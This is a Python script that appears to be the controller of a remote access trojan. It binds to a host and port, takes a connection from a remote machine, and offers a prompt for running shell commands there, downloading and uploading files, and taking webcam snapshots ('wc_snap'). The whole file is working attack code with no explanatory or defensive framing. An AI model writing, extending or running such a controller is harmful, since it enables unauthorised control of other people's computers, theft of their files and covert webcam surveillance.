import revnet
import os
import sys
import time

if __name__=='__main__':

	if len(sys.argv)!=3:

		print("USAGE: "+sys.argv[0]+" <host> <port>")

		exit()

	Host=sys.argv[1]
	Port=sys.argv[2]
	print("Binding "+Host+":"+Port)
	Conn=revnet.ServerConn(Host,int(Port))
	print("Connected: "+Conn.SocketAddr[0])

	CurrentDir=Conn.recvstring()

	while True:

		Command=input(CurrentDir+'>')

		if Command=='l_help':

			print("l_help - Print this help message.")
			print("lls - list contents of local directory")
			print("lcd - change local directory")
			print("lexec - execute local command")

		elif Command[0:3]=='lcd':

			os.chdir(Command[4:])

		elif Command[0:3]=='lls':

			for f in os.listdir():

				print(f)

		elif Command[0:5]=='lexec':

			os.system(Command[6:])

		elif Command[0:4]=='fget':

			Conn.sendstring(Command)
			Ack=Conn.recvstring()
			if Ack=='Bad':
				print('Error getting file')
			else:
				Conn.recvfile(Command[5:])
				print('File received!')
			CurrentDir=Conn.recvstring()

		elif Command[0:6]=='ftrans':

			Conn.sendstring(Command)
			try:

				f=open(Command[7:],'rb')
				f.close()
				Ack='Successful'

			except:

				Ack='Bad'
			Conn.sendstring(Ack)
			Ack=Conn.sendfile(Command[7:])
			if Ack=="Unable to open file":
				print(Ack)
			else:
				print('File sent!')
			CurrentDir=Conn.recvstring()

		elif Command[0:7]=='wc_snap':

			Conn.sendstring(Command)
			Ack=Conn.recvstring()
			if Ack=='Bad':
				print('Error getting file')
			else:
				print('Saving as '+Ack)
				Conn.recvfile(Ack)
				print('File received!')
			CurrentDir=Conn.recvstring()

		elif Command=='exit':

			Conn.sendstring(Command)
			Conn.close()
			exit()

		else:

			Conn.sendstring(Command)
			Ret=Conn.recvstring()
			CurrentDir=Conn.recvstring()
			print(Ret+'\n')
